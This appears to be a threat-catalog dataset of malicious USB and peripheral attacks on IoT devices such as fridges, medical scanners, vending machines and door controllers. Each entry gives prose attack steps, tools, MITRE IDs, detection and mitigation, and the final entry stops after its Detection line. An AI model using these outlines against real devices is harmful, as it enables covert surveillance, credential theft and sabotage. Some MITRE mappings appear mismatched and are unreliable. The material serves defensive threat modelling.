## Malicious Mouse HID Payload in Smart Refrigerator

- **Attack Type**: Malicious Peripheral Attack
- **Target**: Smart Refrigerator
- **Vulnerability**: USB HID auto-authorization
- **MITRE**: T1056.001
- **Impact**: IoT botnet inclusion, remote code execution
- **Tools**: Rubber Ducky inside mouse, Bash payload
- **Scenario**: USB mouse with embedded payload sends remote commands to a Linux-based smart refrigerator.
- **Attack Steps**: Step 1: Attacker hides a keystroke injection device inside a USB mouse. Step 2: The mouse still works, but it also has a script to launch a terminal and run commands. Step 3: The mouse is plugged into the USB of a smart fridge with a Linux OS backend. Step 4: Script triggers terminal silently and executes commands to open SSH or send data. Step 5: Attacker now has command-line control remotely.
- **Detection**: Monitor input devices for unknown activity
- **Solution**: Disable all USB ports unless physically unlocked
- **Tags**: HID Mouse Attack, Smart Appliance Takeover

## Keyboard Overlay with Wireless Logger on Smart Vending Machine

- **Attack Type**: Malicious Peripheral Attack
- **Target**: Smart Vending Machine
- **Vulnerability**: No tamper detection on keypad
- **MITRE**: T1056.002
- **Impact**: PIN theft, privacy breach
- **Tools**: Overlay keyboard, Wireless logger chip
- **Scenario**: Overlay keyboard logs input on smart vending machine for payment card theft.
- **Attack Steps**: Step 1: Attacker creates a plastic overlay that mimics the vending machine keypad. Step 2: Inside is a chip that logs keypresses and transmits them over WiFi or BLE. Step 3: Overlay is placed over the original keypad carefully. Step 4: Users type their payment PINs or phone numbers. Step 5: Attacker downloads logs remotely later.
- **Detection**: Use keypad tamper seals, periodic physical inspection
- **Solution**: Enable tamper alerts on embedded keypad hardware
- **Tags**: Payment Theft, Keylogger, Overlay Device

## Malicious SD Card in Drone Logs Operator Commands

- **Attack Type**: Malicious Peripheral Attack
- **Target**: Drone Controller
- **Vulnerability**: Untrusted storage device
- **MITRE**: T0851
- **Impact**: Drone tracking, mission spoofing
- **Tools**: MicroSD with wireless transmitter, GPS logger
- **Scenario**: An SD card used in a drone controller logs pilot commands and transmits them.
- **Attack Steps**: Step 1: Attacker modifies a microSD card to include a wireless chip and logger. Step 2: It is inserted into the drone controller under the guise of needing extra storage. Step 3: When the controller operates, it logs GPS waypoints, flight paths, and commands. Step 4: These logs are transmitted live to the attacker. Step 5: Data can be used to spoof or disrupt future flights.
- **Detection**: Monitor controller storage I/O and connections
- **Solution**: Encrypt command logs, block wireless storage
- **Tags**: Drone Hack, Pilot Spoof, SD Backdoor

## USB Fan with Audio Recorder on Conference IoT System

- **Attack Type**: Malicious Peripheral Attack
- **Target**: Smart Audio/Room System
- **Vulnerability**: No USB device policy or eavesdrop detection
- **MITRE**: T1123
- **Impact**: Corporate espionage, data leak
- **Tools**: USB fan with mic, Audio logger
- **Scenario**: A USB fan secretly records audio in a conference room equipped with IoT-based audio control.
- **Attack Steps**: Step 1: Attacker modifies a USB fan to contain a small microphone and recorder. Step 2: Fan is gifted or left plugged into a conference room IoT system. Step 3: Fan draws power and begins recording ambient conversations. Step 4: Recorder stores audio locally or transmits to attacker. Step 5: Sensitive internal meetings are leaked.
- **Detection**: USB device scans and soundwave analysis
- **Solution**: Ban unknown USB devices in secure areas
- **Tags**: Audio Spy, Insider Threat, Room Exploit

## USB Audio Adapter Exploits Smart Intercom System

- **Attack Type**: Malicious Peripheral Attack
- **Target**: Smart Intercom System
- **Vulnerability**: Auto-acceptance of audio peripherals
- **MITRE**: T1123
- **Impact**: Covert audio surveillance
- **Tools**: USB Audio Adapter, PulseAudio Config Script
- **Scenario**: A USB sound card is inserted into a smart intercom system to open a covert microphone channel.
- **Attack Steps**: Step 1: Attacker configures a USB audio adapter with firmware that auto-registers as a microphone.Step 2: Attacker prepares a script that adjusts the system’s audio input settings (e.g., PulseAudio settings).Step 3: Adapter is physically plugged into the USB port of the smart intercom during idle hours.Step 4: The IoT intercom detects the adapter as a legitimate audio input device.Step 5: The script auto-runs and routes all microphone input to a file or stream.Step 6: Audio from inside the room is recorded or streamed to the attacker’s server without alerts.
- **Detection**: Monitor audio interface changes and input streams
- **Solution**: Block external audio interfaces unless manually approved
- **Tags**: Audio Spy, USB Exploit, Covert Mic Attack

## Fake USB Debug Tool Reconfigures Embedded Display

- **Attack Type**: Malicious Peripheral Attack
- **Target**: Embedded Medical Display
- **Vulnerability**: No USB debug tool validation
- **MITRE**: T1601
- **Impact**: Patient safety risks, display spoofing
- **Tools**: STM32 debug cable, Pre-loaded scripts, STM32CubeIDE
- **Scenario**: A fake USB debug cable mimics a maintenance tool and pushes malicious commands into a medical device display.
- **Attack Steps**: Step 1: Attacker creates a fake debug cable using an STM32 dev board.Step 2: They flash it with a script that sends low-level reprogramming commands.Step 3: Cable is presented to the hospital as a genuine service tool.Step 4: During routine diagnostics, technician unknowingly connects it to a medical IoT display.Step 5: The fake tool sends firmware update commands that alter displayed metrics.Step 6: Values like heart rate or vitals are spoofed on-screen, causing chaos.
- **Detection**: Log and alert on display config changes
- **Solution**: Use signed firmware/config updates only
- **Tags**: Medical IoT, Firmware Injection, Debug Spoof

## Compromised USB Charger Disrupts Smart Power Strip

- **Attack Type**: Malicious Peripheral Attack
- **Target**: Smart Power Strip
- **Vulnerability**: Lack of surge/voltage protection on control port
- **MITRE**: T1495
- **Impact**: Smart home disruption, unsafe automation
- **Tools**: Modified USB charger, Custom voltage injector
- **Scenario**: A modified USB wall charger sends signal bursts that reboot or crash smart power strips.
- **Attack Steps**: Step 1: Attacker modifies a USB charger to inject voltage spikes at specific intervals.Step 2: The charger is gifted to the victim or left in a shared charging area.Step 3: It is plugged into a smart power strip that has a USB diagnostic or management port.Step 4: The injected voltage or signal glitches the microcontroller in the power strip.Step 5: The device crashes, resets randomly, or disables ports.Step 6: Continuous interference prevents smart automation or causes unsafe operation.
- **Detection**: Detect unusual voltage fluctuations, logging resets
- **Solution**: Use isolated USB control and electrical filters
- **Tags**: Power Surge Attack, USB Glitching

## USB-to-RS232 Cable Hijacks Smart HVAC Unit

- **Attack Type**: Malicious Peripheral Attack
- **Target**: Smart HVAC Controller
- **Vulnerability**: No authentication on maintenance serial port
- **MITRE**: T0811
- **Impact**: Facility control disruption
- **Tools**: USB to RS232 adapter, Terminal emulator (PuTTY), Custom script
- **Scenario**: Malicious USB-RS232 adapter is used to send unauthorized commands to HVAC via maintenance serial port.
- **Attack Steps**: Step 1: Attacker configures a USB-RS232 adapter with a script that sends HVAC commands over serial.Step 2: Cable is disguised as a maintenance tool and inserted during scheduled service.Step 3: Smart HVAC unit sees the connection and enables serial shell.Step 4: Script transmits unauthorized commands to change temperature, disable sensors, or shut off power.Step 5: Attacker can escalate to environmental control or building disruption.
- **Detection**: Serial logging and command auditing
- **Solution**: Secure serial interfaces, require operator login
- **Tags**: RS232 Exploit, Serial Port Attack

## USB WiFi Adapter Creates Fake Network for IoT Printer

- **Attack Type**: Malicious Peripheral Attack
- **Target**: Network Printer
- **Vulnerability**: Prioritizes new network interfaces without confirmation
- **MITRE**: T1040
- **Impact**: Network sniffing, document exfiltration
- **Tools**: USB WiFi adapter, Hostapd, DNS spoofing tools
- **Scenario**: A USB WiFi adapter is inserted into a printer, making it join a rogue wireless network controlled by the attacker.
- **Attack Steps**: Step 1: Attacker configures a WiFi dongle to force device to connect to a rogue SSID.Step 2: The dongle is inserted into a USB port of a networked IoT printer.Step 3: The printer auto-configures to use this new adapter.Step 4: Printer is now unknowingly routed through attacker’s fake access point.Step 5: Attacker intercepts or alters print jobs and harvests internal IP addresses.Step 6: Sensitive documents can be rerouted or saved.
- **Detection**: Monitor network routes and unexpected SSID usage
- **Solution**: Whitelist trusted networks, lock networking hardware
- **Tags**: WiFi Hijack, Network MITM, Printer Attack

## USB MIDI Device Spoofs Control Commands on Smart Audio Mixer

- **Attack Type**: Malicious Peripheral Attack
- **Target**: Smart Audio Mixer
- **Vulnerability**: Accepts any USB MIDI source
- **MITRE**: T1202
- **Impact**: Live event disruption, audio sabotage
- **Tools**: USB MIDI device, Bome MIDI Translator
- **Scenario**: A fake USB MIDI device is used to send commands to a smart audio mixer, altering sound during live events.
- **Attack Steps**: Step 1: Attacker configures a USB MIDI device with predefined audio mix changes.Step 2: Device is plugged into the smart audio mixer’s control USB port.Step 3: Mixer accepts MIDI commands as valid user input.Step 4: Volume, channel routing, or equalizer settings are altered without permission.Step 5: Audio output is distorted or muted mid-event.Step 6: Attacker later removes the device; changes appear accidental.
- **Detection**: Monitor input MIDI sources, validate command origins
- **Solution**: Limit USB devices, log live config changes
- **Tags**: Audio Mixer Hack, MIDI Exploit

## USB Barcode Scanner Payload Hijacks Point-of-Sale IoT System

- **Attack Type**: Malicious Peripheral Attack
- **Target**: Point-of-Sale Terminal
- **Vulnerability**: Accepts HID devices without confirmation
- **MITRE**: T1056.001
- **Impact**: Credential theft, POS backdoor
- **Tools**: Fake USB barcode scanner, Scripted payload
- **Scenario**: A fake barcode scanner with embedded payload executes commands on a POS terminal.
- **Attack Steps**: Step 1: Attacker programs a fake scanner that looks like a USB barcode device.Step 2: When plugged into the Point-of-Sale terminal, it appears as a trusted HID.Step 3: Instead of scanning, it rapidly types a command (e.g., opens a command prompt and runs PowerShell).Step 4: Commands steal credentials or install remote access tools.Step 5: The device is removed before suspicion arises.
- **Detection**: Monitor device enumeration, use endpoint DLP
- **Solution**: Restrict USB HID devices, use port control
- **Tags**: POS Exploit, HID Injection, Credential Theft

## USB-C Dock with Implanted Keylogger on Hospital Workstation

- **Attack Type**: Malicious Peripheral Attack
- **Target**: Medical Workstation
- **Vulnerability**: No detection of USB signal tap
- **MITRE**: T1056.002
- **Impact**: Data theft, HIPAA violation
- **Tools**: Compromised USB-C Dock, Flash storage
- **Scenario**: A USB-C docking station includes a hidden keylogger chip that captures sensitive hospital data.
- **Attack Steps**: Step 1: Attacker modifies a USB-C dock to include a keylogger in the keystroke signal path.Step 2: Dock is installed on a hospital admin workstation connected to IoT medical systems.Step 3: Keystrokes are silently recorded and saved locally.Step 4: Later, attacker retrieves the dock or extracts logs via wireless means.Step 5: Credentials to patient records and device configurations are stolen.
- **Detection**: Scan docks for rogue chips, audit USB traffic
- **Solution**: Use tamper-proof docks, avoid third-party USB hubs
- **Tags**: Healthcare IoT, Hardware Keylogger

## USB Drive with Fake Update for IoT Door Controller

- **Attack Type**: Malicious Peripheral Attack
- **Target**: IoT Door Control System
- **Vulnerability**: No signed firmware enforcement
- **MITRE**: T1608.002
- **Impact**: Unauthorized entry, security compromise
- **Tools**: USB drive, Fake firmware file
- **Scenario**: Attacker uses a USB drive labeled as a firmware update to install a backdoor in an IoT door controller.
- **Attack Steps**: Step 1: Attacker names the firmware file similar to official vendor naming (e.g., fw_update_2025.bin).Step 2: The file is placed on a USB stick and physically inserted into the IoT door control unit.Step 3: Device automatically detects firmware updates from USB.Step 4: It loads the file and flashes the malicious firmware, granting remote backdoor access.Step 5: Attacker now unlocks doors remotely using wireless commands.
- **Detection**: Enable hash-based firmware validation
- **Solution**: Use only signed firmware with physical update confirmation
- **Tags**: Door Access Hack, USB Firmware Attack

## Hidden Bluetooth Keyboard in USB Hub Controls Smart TV

- **Attack Type**: Malicious Peripheral Attack
- **Target**: Smart TV
- **Vulnerability**: Insecure BLE pairing + remote input trust
- **MITRE**: T1056.001
- **Impact**: Botnet recruitment, phishing
- **Tools**: USB hub with BT HID module, Python BLE script
- **Scenario**: A USB hub includes a hidden Bluetooth keyboard module that sends input to a smart TV.
- **Attack Steps**: Step 1: Attacker modifies a USB hub to include a BLE keyboard module.Step 2: Hub is plugged into the USB port of a Smart TV during public demo or in a hotel room.Step 3: Hidden BLE device pairs silently with the Smart TV.Step 4: Attacker sends remote keystrokes like opening browser and visiting a malicious site.Step 5: Malware hosted on the site infects the Smart TV OS.
- **Detection**: Detect remote inputs without user interaction
- **Solution**: Disable Bluetooth input unless manually paired
- **Tags**: BLE Attack, Smart TV, Phishing

## Flash Drive Auto-Launches Hidden Script on Home Hub

- **Attack Type**: Malicious Peripheral Attack
- **Target**: Smart Home Hub
- **Vulnerability**: Auto-execution of files from USB without validation
- **MITRE**: T1204.002
- **Impact**: Backdoor access, system compromise
- **Tools**: USB flash drive, AutoRun.inf (for older systems), Python payload
- **Scenario**: USB flash drive is inserted into a smart home hub and auto-executes a malicious script.
- **Attack Steps**: Step 1: Attacker prepares a USB flash drive with a hidden script and an autorun.inf file.Step 2: Script is disguised as a media or settings file.Step 3: Drive is inserted into the USB port of a smart home hub during idle time.Step 4: The hub auto-scans the drive and runs the script as it appears trusted.Step 5: The script disables alerts and opens outbound communication with the attacker’s server.Step 6: Attacker gains persistent access to the home automation network.
- **Detection**: Monitor USB insert events and scan mounted files
- **Solution**: Disable autorun, validate USB devices manually
- **Tags**: Flash Exploit, Home IoT, Autorun Payload

## Malicious SD Card Used in IoT Surveillance Drone

- **Attack Type**: Malicious Peripheral Attack
- **Target**: IoT Surveillance Drone
- **Vulnerability**: Lacks signature validation for firmware files
- **MITRE**: T1608.001
- **Impact**: Remote hijack of drone camera and GPS
- **Tools**: MicroSD card with embedded firmware, SDR tools
- **Scenario**: A drone’s camera SD slot is used to insert a malicious SD card that compromises flight software.
- **Attack Steps**: Step 1: Attacker modifies a legitimate firmware file and places it onto a microSD card.Step 2: Card is labeled and formatted to mimic an official update.Step 3: During drone maintenance or testing, the SD card is inserted into the camera module.Step 4: Drone accepts the file and updates its onboard software.Step 5: The firmware opens a wireless backdoor, allowing the attacker to track or control the drone remotely.
- **Detection**: Monitor firmware versions and file changes
- **Solution**: Require digitally signed firmware only
- **Tags**: Drone Exploit, Firmware Hijack, SD Attack

## Hidden USB Data Logger in Wall-Mounted Smart Display

- **Attack Type**: Malicious Peripheral Attack
- **Target**: Smart Conference Display
- **Vulnerability**: Unsecured physical ports
- **MITRE**: T1113
- **Impact**: Espionage, info theft
- **Tools**: USB data logger, Mini spy recorder, HDMI split capture
- **Scenario**: A small USB logger is attached behind a wall-mounted IoT display to capture input and video data.
- **Attack Steps**: Step 1: Attacker hides a USB logger behind a mounted smart display used in meeting rooms.Step 2: Logger is connected to the USB port which transfers touch or keyboard inputs.Step 3: It silently records all interactions and stores them locally.Step 4: Optionally, it can relay data wirelessly via BLE or store to microSD.Step 5: Attacker retrieves the logger later and extracts interaction logs.Step 6: Confidential boardroom info or credentials can be exposed.
- **Detection**: Inspect physical access points, USB audits
- **Solution**: Lock USB ports, add tamper-evident seals
- **Tags**: Display Exploit, Physical Access, Data Logger

## USB Fan Used to Deliver Ransomware to IoT Infotainment System

- **Attack Type**: Malicious Peripheral Attack
- **Target**: Car Infotainment System
- **Vulnerability**: No validation for update files
- **MITRE**: T1486
- **Impact**: Ransomware in vehicle, driver distraction
- **Tools**: USB fan, Hidden storage chip, Ransomware payload
- **Scenario**: A novelty USB fan is modified to deliver ransomware to an in-vehicle IoT dashboard system.
- **Attack Steps**: Step 1: Attacker installs a tiny chip inside a USB fan that mimics storage.Step 2: The chip contains a ransomware binary disguised as an update file.Step 3: The fan is plugged into a car infotainment system USB slot.Step 4: System detects the fake update and installs it without verification.Step 5: Screen locks and demands payment to restore access to maps/media.Step 6: Attacker leaves no external traces as the payload auto-executes.
- **Detection**: Monitor file installs, secure USB firmware updates
- **Solution**: Disallow external storage execution
- **Tags**: Automotive IoT, Ransomware, USB Fan

## USB Rubber Ducky Installs Reverse Shell on IoT Medical Scanner

- **Attack Type**: Malicious Peripheral Attack
- **Target**: CT / MRI Scanner System
- **Vulnerability**: Trusts HID USB inputs
- **MITRE**: T1059.001
- **Impact**: Patient data theft, medical sabotage
- **Tools**: USB Rubber Ducky, Ducky Script, Netcat
- **Scenario**: Keystroke injection tool opens a reverse shell on a Linux-based CT scanner system.
- **Attack Steps**: Step 1: Attacker programs USB Rubber Ducky with script that opens terminal and runs a reverse shell.Step 2: The tool is disguised as a regular USB drive.Step 3: Plugged into the medical scanner’s technician USB port.Step 4: The script auto-types commands to connect back to the attacker’s machine.Step 5: Remote access is granted; attacker can copy scan data or interrupt processes.Step 6: Ducky is removed before detection.
- **Detection**: Monitor for rogue command shells
- **Solution**: Block unauthorized HID input and require physical authentication
- **Tags**: Healthcare IoT, Reverse Shell, HID Attack

## USB-to-Ethernet Adapter Redirects IoT Network Traffic

- **Attack Type**: Malicious Peripheral Attack
- **Target**: IoT Controller or Hub
- **Vulnerability**: No network interface filtering
- **MITRE**: T1040
- **Impact**: MITM attack, data interception
- **Tools**: USB-Ethernet Adapter, DHCP Spoofing Tools
- **Scenario**: USB adapter hijacks Ethernet configuration and reroutes device traffic to attacker’s server.
- **Attack Steps**: Step 1: Attacker prepares a USB-to-Ethernet adapter with custom firmware.Step 2: Adapter is configured to act as a rogue DHCP server.Step 3: Adapter is plugged into the IoT controller port (during maintenance).Step 4: Device receives new network configuration, using attacker's IP as gateway.Step 5: All network traffic is routed through attacker’s controlled path.Step 6: Sensitive data is captured or altered in transit.
- **Detection**: Monitor gateway/IP changes in IoT logs
- **Solution**: Lock network config settings and validate DHCP leases
- **Tags**: Network Attack, DHCP Spoof, USB NIC

## RFID-Enabled USB Dongle Spoofs Factory Access Logs

- **Attack Type**: Malicious Peripheral Attack
- **Target**: Industrial IoT Access System
- **Vulnerability**: No RFID signal authentication
- **MITRE**: T1071.001
- **Impact**: Unauthorized access, insider threat
- **Tools**: USB RFID reader, Mifare card copier
- **Scenario**: RFID reader integrated in USB logs access cards and spoofs entries in an industrial IoT system.
- **Attack Steps**: Step 1: Attacker builds a USB device with RFID reader and storage.Step 2: Device is inserted into an IoT system handling employee check-ins.Step 3: As employees tap their RFID cards, the device clones the signals.Step 4: Cloned data is used to spoof attendance or access logs.Step 5: Attacker replicates or sells access credentials.Step 6: Logs appear authentic unless manually reviewed.
- **Detection**: Compare RFID timestamps with video surveillance
- **Solution**: Encrypt and timestamp RFID reads
- **Tags**: RFID Clone, Access Fraud, USB Log Attack

## BadUSB Lamp Drops Malware on IoT Coffee Machine

- **Attack Type**: Malicious Peripheral Attack
- **Target**: Smart Coffee Dispenser
- **Vulnerability**: Automatic driver install without prompt
- **MITRE**: T1204.002
- **Impact**: Entry point into office network
- **Tools**: USB lamp, BadUSB firmware, Meterpreter
- **Scenario**: A USB lamp placed in a breakroom uploads spyware onto a networked coffee dispenser.
- **Attack Steps**: Step 1: Attacker flashes the USB lamp with malware disguised as a driver.Step 2: Lamp is left near or plugged into a smart coffee machine.Step 3: The device auto-installs the ‘driver’, executing the hidden malware.Step 4: Malware beacons out via the coffee machine’s network connection.Step 5: Attacker now scans the internal network from the infected device.
- **Detection**: Monitor USB devices by ID and driver activity
- **Solution**: Block unknown USB device types in common areas
- **Tags**: Covert Attack, IoT Entry Point

## USB Ethernet Device Forces Proxy Settings in Smart Router

- **Attack Type**: Malicious Peripheral Attack
- **Target**: Smart Home Router
- **Vulnerability**: No admin approval required for proxy settings
- **MITRE**: T1600
- **Impact**: DNS/HTTP redirection
- **Tools**: USB NIC, Proxy configuration script
- **Scenario**: USB device configures proxy settings on a home smart router to redirect web traffic.
- **Attack Steps**: Step 1: Attacker configures a USB Ethernet device with a DHCP config that includes a rogue proxy.Step 2: Device is inserted into the router’s USB management port.Step 3: Router auto-loads configuration or script.Step 4: Proxy settings are applied to internal user traffic.Step 5: Attacker logs all visited URLs or injects phishing pages.Step 6: Users experience slower speeds but are unaware of redirection.
- **Detection**: Monitor proxy and DNS settings frequently
- **Solution**: Disable USB auto-config features in routers
- **Tags**: Proxy Hack, Router Exploit

## Smart Mirror Exploited via USB Webcam Implant

- **Attack Type**: Malicious Peripheral Attack
- **Target**: Smart Mirror
- **Vulnerability**: No access control on peripheral registration
- **MITRE**: T1123
- **Impact**: Privacy breach, hidden surveillance
- **Tools**: USB webcam module, Power cable, RTSP stream setup
- **Scenario**: Webcam hidden in a USB power cable streams private room activity from a smart mirror.
- **Attack Steps**: Step 1: Attacker hides a webcam module inside a USB cable connected to the mirror.Step 2: The cable powers the mirror but also connects to internal USB hub.Step 3: Smart mirror auto-registers webcam for diagnostics or voice input.Step 4: Video feed is silently transmitted to the attacker’s cloud server via RTSP.Step 5: Private user activity in homes or hotels is recorded and leaked.Step 6: Webcam is hard to detect as it is built into the cable itself.
- **Detection**: Monitor all video devices and block unknown streams
- **Solution**: Restrict webcam detection to trusted USB IDs
- **Tags**: Hidden Camera, USB Spy Cable, Mirror Exploit

## USB Device Masquerades as IoT Firmware Updater

- **Attack Type**: Malicious Peripheral Attack
- **Target**: Smart Lighting Controller
- **Vulnerability**: Unsigned firmware accepted by default
- **MITRE**: T1608.001
- **Impact**: Espionage, building sabotage
- **Tools**: USB stick, Fake firmware update file, Bash payload
- **Scenario**: A malicious USB drive mimics a vendor firmware updater and installs spyware on a smart lighting controller.
- **Attack Steps**: Step 1: Attacker downloads a legitimate firmware file for the lighting controller from the vendor site.Step 2: They modify the file to include a spyware payload that communicates with their server.Step 3: The updated file is renamed to match official naming (e.g., lighting_firmware_v3.bin).Step 4: The attacker places the file on a USB and labels it as “Lighting Patch”.Step 5: A technician plugs it into the controller assuming it's an update.Step 6: The device installs the file, and the malware gives attacker remote control of lighting schedules.
- **Detection**: Compare firmware file hash against approved list
- **Solution**: Enforce signed firmware and physical update approval
- **Tags**: USB Firmware Spoof, Lighting Exploit

## USB Webcam Spoofs Motion Detection in Smart Security System

- **Attack Type**: Malicious Peripheral Attack
- **Target**: Smart Security Camera System
- **Vulnerability**: No verification of live vs. looped feed
- **MITRE**: T1113
- **Impact**: Physical security evasion
- **Tools**: USB Webcam, VLC looped stream, Video editor
- **Scenario**: A USB webcam is modified to feed pre-recorded footage into a motion-detection-based security system.
- **Attack Steps**: Step 1: Attacker records a few minutes of the camera feed showing an empty scene.Step 2: They modify a USB webcam to loop this recorded video stream.Step 3: Webcam is swapped with the real one on a smart motion detector system.Step 4: The system keeps monitoring the feed, thinking it's real-time.Step 5: During this period, attacker enters the area unnoticed as no motion is triggered.Step 6: The loop ends before the feed is reviewed.
- **Detection**: Detect feed anomalies, use timestamp overlaying
- **Solution**: Enable cryptographic timestamping of streams
- **Tags**: Camera Spoofing, Video Loop Attack

## USB Charging Cable Records Touch Events from Smart Refrigerator

- **Attack Type**: Malicious Peripheral Attack
- **Target**: Smart Refrigerator
- **Vulnerability**: Input lines shared with diagnostics
- **MITRE**: T1056.002
- **Impact**: Data leak, parental control bypass
- **Tools**: Modified USB cable, Capacitive input logger, Flash storage
- **Scenario**: A USB charging cable records capacitive input data from a smart fridge's control panel.
- **Attack Steps**: Step 1: Attacker modifies a USB cable with a small chip that logs input signals.Step 2: Cable is plugged into a USB port of a smart fridge used to charge devices.Step 3: The fridge uses the same line for touchscreen diagnostics.Step 4: Cable begins logging user touch patterns, PINs, or menu selections.Step 5: Attacker retrieves the cable later to extract data.Step 6: PIN-based parental locks or orders can be bypassed.
- **Detection**: Analyze voltage/data signals on diagnostic pins
- **Solution**: Isolate charging from data lines, block unknown USB
- **Tags**: Covert Input Logger, Smart Appliance Spy

## USB Mouse Injects Voice Commands in Smart Speaker

- **Attack Type**: Malicious Peripheral Attack
- **Target**: Smart Speaker or Voice Assistant
- **Vulnerability**: Always-on voice recognition, no origin check
- **MITRE**: T1059.003
- **Impact**: Voice abuse, home automation bypass
- **Tools**: USB mouse with hidden speaker, Pre-recorded audio clips
- **Scenario**: A USB mouse with a built-in speaker injects audible commands for a smart assistant when no one is around.
- **Attack Steps**: Step 1: Attacker modifies a USB mouse to include a hidden speaker element.Step 2: Mouse plays pre-recorded voice commands at very low volume directly toward the smart speaker.Step 3: Commands include “open garage”, “disable alarm”, “set reminder”, etc.Step 4: Speaker hears and processes the command as if it came from the user.Step 5: No logs or visual alerts are triggered.Step 6: Attacker remotely benefits from the triggered actions.
- **Detection**: Analyze voice logs and microphone noise floor
- **Solution**: Enable voice PINs and directional mic filtering
- **Tags**: Audio Injection, Voice Exploit

## USB-to-SATA Adapter Installs Rootkit in Smart DVR

- **Attack Type**: Malicious Peripheral Attack
- **Target**: Smart DVR Recorder
- **Vulnerability**: Unprotected boot sequence on USB storage
- **MITRE**: T1542.003
- **Impact**: Evidence tampering, surveillance control
- **Tools**: USB-to-SATA adapter, Rootkit loader, Disk imaging tool
- **Scenario**: A rootkit is installed into the DVR’s hard disk using a USB-to-SATA adapter while connected via USB port.
- **Attack Steps**: Step 1: Attacker prepares a USB-to-SATA adapter and flashes it with a tool to write boot-level malware.Step 2: Device is connected to the DVR’s USB port (which has SATA passthrough for storage access).Step 3: Tool modifies the master boot record or installs a rootkit on the hard disk.Step 4: DVR boots normally but malware is active in the background.Step 5: Attacker can now erase or alter recordings remotely.
- **Detection**: Monitor disk writes and startup integrity
- **Solution**: Use read-only boot partitions and signed bootloaders
- **Tags**: DVR Rootkit, Boot Sector Attack

## USB Smartcard Reader Installs Fake Credentials in Industrial Gateway

- **Attack Type**: Malicious Peripheral Attack
- **Target**: Industrial Gateway Device
- **Vulnerability**: No mutual authentication for smartcard interface
- **MITRE**: T1556.004
- **Impact**: Unauthorized control of industrial equipment
- **Tools**: USB Smartcard emulator, Proxmark3, Credential injector
- **Scenario**: A fake smartcard reader is inserted into an authentication port and installs false credentials.
- **Attack Steps**: Step 1: Attacker builds a smartcard reader that mimics a real employee card.Step 2: Reader is plugged into the USB port on a secured industrial gateway.Step 3: Gateway pulls the fake credential data without user approval.Step 4: Data is stored as a trusted admin card in local memory.Step 5: Attacker later uses matching card to gain access through gateway’s physical layer.Step 6: System logs reflect a legitimate card interaction.
- **Detection**: Log and audit smartcard additions in system
- **Solution**: Use mutual auth with PKI and badge ID logs
- **Tags**: Smartcard Spoof, Industrial Access

## USB Keyboard Alters Time Settings on IoT Meter

- **Attack Type**: Malicious Peripheral Attack
- **Target**: Smart Utility Meter
- **Vulnerability**: CLI access without keyboard whitelisting
- **MITRE**: T1070.006
- **Impact**: Energy fraud, billing manipulation
- **Tools**: USB keyboard, Keystroke macro, CLI command for time change
- **Scenario**: A USB keyboard is used to silently change system time on a power usage meter, altering report accuracy.
- **Attack Steps**: Step 1: Attacker programs a keystroke macro that opens the time setting on the meter’s CLI.Step 2: The macro is loaded into a programmable keyboard.Step 3: Keyboard is plugged into the meter during a quick maintenance session.Step 4: Macro types out the time change commands quickly, altering logs.Step 5: Meter appears to be working fine but reports are now time-shifted or invalid.Step 6: Billing or reporting is now compromised.
- **Detection**: Track time changes in logs and require confirmation
- **Solution**: Lock time settings via signed control console only
- **Tags**: Energy IoT, Keyboard Hack

## USB Charger with Motion Sensor Harvests Activity from Office Desk

- **Attack Type**: Malicious Peripheral Attack
- **Target**: Office IoT Charging Area
- **Vulnerability**: No motion detection policy for peripherals
- **MITRE**: T1125
- **Impact**: Reconnaissance, behavioral tracking
- **Tools**: USB power cube with PIR sensor, Flash storage, BLE chip
- **Scenario**: A USB charging cube contains a motion sensor that records patterns of user activity in office setups.
- **Attack Steps**: Step 1: Attacker installs a PIR motion sensor and flash memory into a USB wall cube.Step 2: Cube is placed on a coworker's desk as a gift or forgotten object.Step 3: When plugged in, it begins logging movement near the desk based on motion.Step 4: After 24–48 hours, attacker collects the cube and extracts activity logs.Step 5: Logs can reveal work hours, presence, and meeting times.Step 6: Used to plan targeted attacks.
- **Detection**: Scan for hidden electronics in non-standard USBs
- **Solution**: Ban unknown chargers or use supply chain vetting
- **Tags**: PIR Sensor Exploit, Covert Recon

## USB LED Device Causes Disruption in Smart Classroom Systems

- **Attack Type**: Malicious Peripheral Attack
- **Target**: Smart Classroom Hub
- **Vulnerability**: Poor USB power regulation
- **MITRE**: T1495
- **Impact**: Reboot loop, classroom disruption
- **Tools**: USB LED toy, Power spike generator
- **Scenario**: An LED gadget exploits power management bugs in classroom IoT hubs, triggering frequent reboots.
- **Attack Steps**: Step 1: Attacker modifies a USB LED toy to emit irregular voltage draw.Step 2: The device is plugged into a teaching hub or AV controller.Step 3: Repeated voltage fluctuation causes the device to reboot or hang.Step 4: AV output, projector, or whiteboard connections drop frequently.Step 5: Teachers assume it's system instability.Step 6: Disruption continues until the LED is removed.
- **Detection**: Monitor power draw from USB and shutdown outliers
- **Solution**: Harden power management on IoT endpoints
- **Tags**: Voltage Exploit, Classroom IoT

## USB GPS Spoofing Device Misleads IoT-Based Fleet Tracker

- **Attack Type**: Malicious Peripheral Attack
- **Target**: Fleet IoT GPS Tracker
- **Vulnerability**: GPS source priority flaw
- **MITRE**: T1592.002
- **Impact**: Route fraud, logistics manipulation
- **Tools**: USB GPS dongle, NMEA sentence injector
- **Scenario**: A USB GPS device injects fake coordinates into a vehicle tracking unit.
- **Attack Steps**: Step 1: Attacker programs a USB GPS dongle to generate custom location data.Step 2: It is plugged into a fleet tracking IoT device in the vehicle.Step 3: The IoT unit accepts the USB GPS as the new location source.Step 4: The device reports incorrect coordinates to the central server.Step 5: This hides actual location, masks routes, or disrupts delivery logs.Step 6: Attacker later removes the dongle to erase traces.
- **Detection**: Use multiple GPS sources with validation logic
- **Solution**: Lock GPS source and alert on sudden change
- **Tags**: GPS Spoof, Vehicle IoT Attack

## USB Hub with Hidden Keylogger Installed in Smart Vending Machine

- **Attack Type**: Malicious Peripheral Attack
- **Target**: Smart Vending Machine
- **Vulnerability**: No monitoring of external USB hubs
- **MITRE**: T1056.001
- **Impact**: Credential theft, monetary loss
- **Tools**: USB hub with keylogger chip, Data extractor, Flash storage
- **Scenario**: Attacker uses a USB hub to secretly log keystrokes typed on a touchscreen-based vending machine used for PIN entry.
- **Attack Steps**: Step 1: Attacker creates a USB hub with a hidden keylogger chip inside.Step 2: The USB hub is placed inside or behind the vending machine where maintenance USB devices are connected.Step 3: The vending machine touchscreen input is routed through the hub.Step 4: All user touch-based PINs or selection inputs are silently recorded.Step 5: After a few days, attacker returns and extracts the log data via USB.Step 6: Stolen PINs may be used to steal items or funds from user accounts.
- **Detection**: Inspect physical connections, log USB routing
